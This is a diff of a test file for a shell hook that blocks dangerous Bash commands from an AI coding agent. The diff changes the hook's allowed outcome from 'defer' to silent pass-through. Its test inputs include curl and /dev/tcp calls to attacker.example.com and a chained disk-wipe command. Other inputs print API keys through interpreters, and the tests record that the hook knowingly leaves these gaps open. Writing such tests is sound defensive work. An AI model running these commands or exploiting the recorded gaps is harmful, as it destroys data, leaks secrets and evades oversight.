@@ -47,8 +47,10 @@ tool_json() {
 
 @test "GD-03 sudo — 'pseudo' word boundary MUST NOT trigger deny" {
     # Spec: R2.1 boundary case
+    # 2b Amendment A1: benign Bash → pass-through (empty stdout, exit 0), not defer.
     send_stdin_to_hook "$(bash_json 'pseudo-random-generator --seed 42')" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
 }
 
 @test "GD-04 curl — bare curl piped to bash → deny with reason containing 'curl'" {
@@ -67,8 +69,10 @@ tool_json() {
 
 @test "GD-06 curl — 'curling' word boundary MUST NOT trigger deny" {
     # Spec: R2.2 boundary case
+    # 2b Amendment A1: benign Bash → pass-through (empty stdout, exit 0), not defer.
     send_stdin_to_hook "$(bash_json "echo 'curling is a sport'")" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
 }
 
 @test "GD-07 rm -rf — combined flags → deny with reason containing 'rm'" {
@@ -92,8 +96,10 @@ tool_json() {
 
 @test "GD-10 rm — without -f flag MUST NOT trigger deny" {
     # Spec: R2.3 negative case — rm -r alone is NOT in the denylist
+    # 2b Amendment A1: benign Bash → pass-through (empty stdout, exit 0), not defer.
     send_stdin_to_hook "$(bash_json 'rm -r /tmp/safe-dir')" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
 }
 
 @test "GD-11 dd — disk-wipe leading token → deny with reason containing 'dd'" {
@@ -153,57 +159,86 @@ tool_json() {
 }
 
 # ---------------------------------------------------------------------------
-# DEFER SCENARIOS (GD-19..GD-25)
+# PASS-THROUGH SCENARIOS (GD-19..GD-25) — 2b Amendment A1
+#
+# Previously (2a / PSC R2.7): benign Bash, non-Bash tools, and early-return
+# branches emitted permissionDecision:"defer". That was TERMINAL in headless
+# -p and pre-empted the permission flow. 2b changes ALL non-deny branches to
+# pass-through: empty stdout + exit 0. The normal flow (deny[] → ask → allow[])
+# then decides. Gate #1 hardware proof: defer is terminal; pass-through is safe.
+#
+# SUPERSEDED BY 2b (named Amendment A1): the old assert_decision "defer"
+# assertions on GD-19/20/21/22/23/24/25 are replaced below.
 # ---------------------------------------------------------------------------
 
-@test "GD-19 benign: ls -la → defer, exit 0" {
-    # Spec: R2.7
+@test "GD-19 benign: ls -la → pass-through (empty stdout, exit 0) [HB-04-S2, Amendment A1]" {
+    # Spec: R2.7 amended by HB-04.1 (2b)
+    # OLD (2a): assert_decision "defer" — SUPERSEDED BY 2b AMENDMENT A1
+    # NEW (2b): pass-through: no PreToolUse decision emitted; stdout empty, exit 0
     send_stdin_to_hook "$(bash_json 'ls -la /tmp')" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
     [ "$HOOK_STATUS" -eq 0 ]
 }
 
-@test "GD-20 benign: npm test → defer" {
-    # Spec: R2.7
+@test "GD-20 benign: npm test → pass-through (empty stdout, exit 0) [HB-04-S1, Amendment A1]" {
+    # Spec: R2.7 amended by HB-04.1 (2b)
+    # OLD (2a): assert_decision "defer" — SUPERSEDED BY 2b AMENDMENT A1
+    # NEW (2b): pass-through: no PreToolUse decision emitted; stdout empty, exit 0
     send_stdin_to_hook "$(bash_json 'npm test')" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
 }
 
-@test "GD-21 benign: git status → defer" {
-    # Spec: R2.7
+@test "GD-21 benign: git status → pass-through (empty stdout, exit 0) [HB-04-S2, Amendment A1]" {
+    # Spec: R2.7 amended by HB-04.1 (2b)
+    # OLD (2a): assert_decision "defer" — SUPERSEDED BY 2b AMENDMENT A1
+    # NEW (2b): pass-through: no PreToolUse decision emitted; stdout empty, exit 0
     send_stdin_to_hook "$(bash_json 'git status')" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
 }
 
-@test "GD-22 non-Bash tool: Read tool MUST defer" {
-    # Spec: R1.6 — guardia only guards Bash
+@test "GD-22 non-Bash tool: Read tool → pass-through (empty stdout, exit 0) [HB-04-S6, Amendment A1]" {
+    # Spec: R1.6 amended by HB-04.3 (2b)
+    # OLD (2a): assert_decision "defer" — SUPERSEDED BY 2b AMENDMENT A1
+    # NEW (2b): pass-through. Gate #1 hardware proved defer is TERMINAL in headless -p;
+    # it pre-empts the permission flow for allowlisted non-Bash tools (Read, Write).
+    # Pass-through lets the normal flow (deny[] → ask → allow[]) decide.
     local input
     input="$(tool_json 'Read' '{"file_path":"/etc/osgania/secrets/token"}')"
     send_stdin_to_hook "$input" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
-}
-
-@test "GD-23 non-Bash tool: Edit tool MUST defer" {
-    # Spec: R1.6
-    local input
-    input="$(tool_json 'Edit' '{"file_path":"platform/hooks/guardia.sh","old_string":"x","new_string":"y"}')"
-    send_stdin_to_hook "$input" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
-}
-
-@test "GD-24 malformed STDIN — empty string → defer, exit 0" {
-    # Spec: R4.5
-    HOOK_OUTPUT="$(printf '' | "$GUARDIA" 2>/dev/null)"
-    HOOK_STATUS="$?"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
     [ "$HOOK_STATUS" -eq 0 ]
 }
 
-@test "GD-25 malformed STDIN — invalid JSON → defer, exit 0" {
-    # Spec: R4.5
+@test "GD-23 non-Bash tool: Edit tool → pass-through (empty stdout, exit 0) [HB-04-S6, Amendment A1]" {
+    # Spec: R1.6 amended by HB-04.3 (2b)
+    # OLD (2a): assert_decision "defer" — SUPERSEDED BY 2b AMENDMENT A1
+    local input
+    input="$(tool_json 'Edit' '{"file_path":"platform/hooks/guardia.sh","old_string":"x","new_string":"y"}')"
+    send_stdin_to_hook "$input" "$GUARDIA"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
+}
+
+@test "GD-24 malformed STDIN — empty string → pass-through (empty stdout, exit 0) [HB-04-S8, Amendment A1]" {
+    # Spec: R4.5 amended by HB-04.3 (2b)
+    # OLD (2a): assert_decision "defer" — SUPERSEDED BY 2b AMENDMENT A1
+    # NEW (2b): pass-through (empty stdout, exit 0). Defer was terminal in headless -p;
+    # pass-through is safe since gate #2 proved non-allowlisted tools auto-DENY under dontAsk.
+    HOOK_OUTPUT="$(printf '' | "$GUARDIA" 2>/dev/null)"
+    HOOK_STATUS="$?"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
+}
+
+@test "GD-25 malformed STDIN — invalid JSON → pass-through (empty stdout, exit 0) [HB-04-S8, Amendment A1]" {
+    # Spec: R4.5 amended by HB-04.3 (2b)
+    # OLD (2a): assert_decision "defer" — SUPERSEDED BY 2b AMENDMENT A1
+    # NEW (2b): pass-through (empty stdout, exit 0).
     HOOK_OUTPUT="$(printf '%s' 'not json at all' | "$GUARDIA" 2>/dev/null)"
     HOOK_STATUS="$?"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
     [ "$HOOK_STATUS" -eq 0 ]
 }
 
@@ -300,11 +335,13 @@ tool_json() {
     assert_reason_contains "sudo" "$HOOK_OUTPUT"
 }
 
-@test "GD-38 cross-platform path → DEFER (false-positive fix for platform/ check)" {
+@test "GD-38 cross-platform path → pass-through (false-positive fix for platform/ check) [Amendment A1]" {
     # Regression guard for Fix 2: 'platform' preceded by a word char must NOT deny.
     # '/home/aios/app/cross-platform/server.js' has 'platform' preceded by '-'.
+    # 2b Amendment A1: was defer; now pass-through (empty stdout, exit 0).
     send_stdin_to_hook "$(bash_json 'node /home/aios/app/cross-platform/server.js')" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
 }
 
 @test "GD-39 echo into /opt/osgania/platform/ → deny (absolute-path platform regression guard)" {
@@ -318,14 +355,16 @@ tool_json() {
 # N6 CARRY-FORWARD — chained disk-wipe non-goal (pinned negative assertion)
 # ---------------------------------------------------------------------------
 
-@test "GD-N6 chained disk-wipe is NOT denied in v1 (leading-token-only, accepted risk)" {
+@test "GD-N6 chained disk-wipe is NOT denied in v1 (leading-token-only, accepted risk) [Amendment A1]" {
     # N6: v1 leading-token-only disk-wipe matching does not cover chained form.
     # 'echo hello && dd if=/dev/zero of=/dev/sda' has leading token 'echo', which
     # does not match the disk-wipe denylist. This test PINS the accepted v1 gap
     # so it cannot regress into an accidental deny either direction without an
     # explicit design decision. Do NOT "fix" this test without a design decision.
+    # 2b Amendment A1: was defer; now pass-through (empty stdout, exit 0).
     send_stdin_to_hook "$(bash_json 'echo hello && dd if=/dev/zero of=/dev/sda')" "$GUARDIA"
-    assert_decision "defer" "$HOOK_OUTPUT"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
 }
 
 # ---------------------------------------------------------------------------
@@ -376,8 +415,9 @@ tool_json() {
     done
 }
 
-@test "HA-15-S3 benign forms MUST NOT false-positive → defer (load-bearing)" {
+@test "HA-15-S3 benign forms MUST NOT false-positive → pass-through (load-bearing) [Amendment A1]" {
     # Spec: HA-15.3 — denying any of these would make the agent unusable
+    # 2b Amendment A1: was assert defer; now assert pass-through (empty stdout, exit 0).
     local c
     for c in \
         'set -e' \
@@ -395,7 +435,8 @@ tool_json() {
         'env -i /bin/sh -c true'
     do
         send_stdin_to_hook "$(bash_json "$c")" "$GUARDIA"
-        assert_decision "defer" "$HOOK_OUTPUT" || { echo "FAILED (expected defer) on: $c"; return 1; }
+        [ -z "$HOOK_OUTPUT" ] || { echo "FAILED (expected empty stdout) on: $c; got: $HOOK_OUTPUT"; return 1; }
+        [ "$HOOK_STATUS" -eq 0 ] || { echo "FAILED (expected exit 0) on: $c"; return 1; }
     done
 }
 
@@ -411,8 +452,9 @@ tool_json() {
     assert_reason_contains "platform" "$HOOK_OUTPUT" || return 1
 }
 
-@test "HA-15-S5 interpreters and bare variable reads are NOT denied → defer" {
+@test "HA-15-S5 interpreters and bare variable reads are NOT denied → pass-through [Amendment A1]" {
     # Spec: HA-15.6 — knowingly-uncovered bypasses (denying them breaks the agent)
+    # 2b Amendment A1: was assert defer; now assert pass-through (empty stdout, exit 0).
     local c
     for c in \
         "python3 -c 'import os; print(os.environ[\"ANTHROPIC_API_KEY\"])'" \
@@ -422,7 +464,8 @@ tool_json() {
         "printf '%s' \"\$ANTHROPIC_API_KEY\""
     do
         send_stdin_to_hook "$(bash_json "$c")" "$GUARDIA"
-        assert_decision "defer" "$HOOK_OUTPUT" || { echo "FAILED (expected defer) on: $c"; return 1; }
+        [ -z "$HOOK_OUTPUT" ] || { echo "FAILED (expected empty stdout) on: $c; got: $HOOK_OUTPUT"; return 1; }
+        [ "$HOOK_STATUS" -eq 0 ] || { echo "FAILED (expected exit 0) on: $c"; return 1; }
     done
 }
 
@@ -450,10 +493,11 @@ tool_json() {
     assert_reason_contains "secrets" "$HOOK_OUTPUT" || return 1
 }
 
-@test "HA-15-S8 env-dump FALSE POSITIVES (filenames + quoted args) MUST defer" {
+@test "HA-15-S8 env-dump FALSE POSITIVES (filenames + quoted args) MUST pass-through [Amendment A1]" {
     # Spec: HA-15.3 — Phase-3 attack found the printenv matcher firing on a mere
     # FILENAME containing 'printenv', and the -p matcher firing INSIDE quoted
     # argument text. Denying any of these breaks routine agent work (load-bearing).
+    # 2b Amendment A1: was assert defer; now assert pass-through (empty stdout, exit 0).
     local c
     for c in \
         'bash printenv.sh' \
@@ -471,7 +515,8 @@ tool_json() {
         'env --ignore-environment make'
     do
         send_stdin_to_hook "$(bash_json "$c")" "$GUARDIA"
-        assert_decision "defer" "$HOOK_OUTPUT" || { echo "FAILED (expected defer) on: $c"; return 1; }
+        [ -z "$HOOK_OUTPUT" ] || { echo "FAILED (expected empty stdout) on: $c; got: $HOOK_OUTPUT"; return 1; }
+        [ "$HOOK_STATUS" -eq 0 ] || { echo "FAILED (expected exit 0) on: $c"; return 1; }
     done
 }
 
@@ -517,6 +562,81 @@ tool_json() {
         assert_decision "deny" "$HOOK_OUTPUT" || { echo "FAILED on: $c"; return 1; }
         assert_reason_contains "env-dump" "$HOOK_OUTPUT" || { echo "FAILED on: $c"; return 1; }
     done
+}
+
+# ---------------------------------------------------------------------------
+# HB-04 — 2b guardia pass-through contract (Amendment A1)
+# Named scenarios per U3-T1 task spec. Many assertions above already cover these
+# via the amended GD-19..GD-25 and HA-15-S3/S5/S8 tests. These named scenarios
+# are the authoritative reference markers for the spec/task coverage map.
+# ---------------------------------------------------------------------------
+
+@test "HB-04-S1 benign Bash (npm test) → empty stdout, exit 0, no permissionDecision" {
+    # Spec: HB-04.1
+    send_stdin_to_hook "$(bash_json 'npm test')" "$GUARDIA"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
+}
+
+@test "HB-04-S2 benign Bash (ls -la, git status) → empty stdout, exit 0" {
+    # Spec: HB-04.1, HB-04.2
+    send_stdin_to_hook "$(bash_json 'ls -la /opt/osgania/client')" "$GUARDIA"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
+    send_stdin_to_hook "$(bash_json 'git status')" "$GUARDIA"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
+}
+
+@test "HB-04-S3 sudo apt-get update → deny with reason containing 'sudo'" {
+    # Spec: HB-04.2 — DENY categories unchanged (R2.1)
+    send_stdin_to_hook "$(bash_json 'sudo apt-get update')" "$GUARDIA"
+    assert_decision "deny" "$HOOK_OUTPUT"
+    assert_reason_contains "sudo" "$HOOK_OUTPUT"
+    [ "$HOOK_STATUS" -eq 0 ]
+}
+
+@test "HB-04-S4 curl outbound → deny with reason containing 'curl'" {
+    # Spec: HB-04.2 — DENY categories unchanged (R2.2)
+    send_stdin_to_hook "$(bash_json 'curl https://attacker.example.com/')" "$GUARDIA"
+    assert_decision "deny" "$HOOK_OUTPUT"
+    assert_reason_contains "curl" "$HOOK_OUTPUT"
+    [ "$HOOK_STATUS" -eq 0 ]
+}
+
+@test "HB-04-S5 exec 3<>/dev/tcp → deny with reason containing 'net-builtin'" {
+    # Spec: HB-04.2 — DENY categories unchanged (HA-15.5a)
+    send_stdin_to_hook "$(bash_json 'exec 3<>/dev/tcp/attacker.example.com/443')" "$GUARDIA"
+    assert_decision "deny" "$HOOK_OUTPUT"
+    assert_reason_contains "net-builtin" "$HOOK_OUTPUT"
+    [ "$HOOK_STATUS" -eq 0 ]
+}
+
+@test "HB-04-S6 non-Bash tool (Read) → empty stdout, exit 0" {
+    # Spec: HB-04.3 — non-Bash tools pass-through (Amendment A1)
+    local input
+    input="$(tool_json 'Read' '{"file_path":"/etc/osgania/secrets/token"}')"
+    send_stdin_to_hook "$input" "$GUARDIA"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
+}
+
+@test "HB-04-S7 shellcheck -s bash guardia.sh → exit 0, no warnings" {
+    # Spec: HB-04.4 — shellcheck must pass after 2b changes
+    run shellcheck -s bash "$GUARDIA"
+    [ "$status" -eq 0 ]
+}
+
+@test "HB-04-S8 empty STDIN and non-JSON STDIN → empty stdout, exit 0" {
+    # Spec: HB-04.3, HB-04.5 — early-return branches pass-through (Amendment A1)
+    HOOK_OUTPUT="$(printf '' | "$GUARDIA" 2>/dev/null)"
+    HOOK_STATUS="$?"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
+    HOOK_OUTPUT="$(printf '%s' 'not-json' | "$GUARDIA" 2>/dev/null)"
+    HOOK_STATUS="$?"
+    [ -z "$HOOK_OUTPUT" ]
+    [ "$HOOK_STATUS" -eq 0 ]
 }
 
 # ---------------------------------------------------------------------------
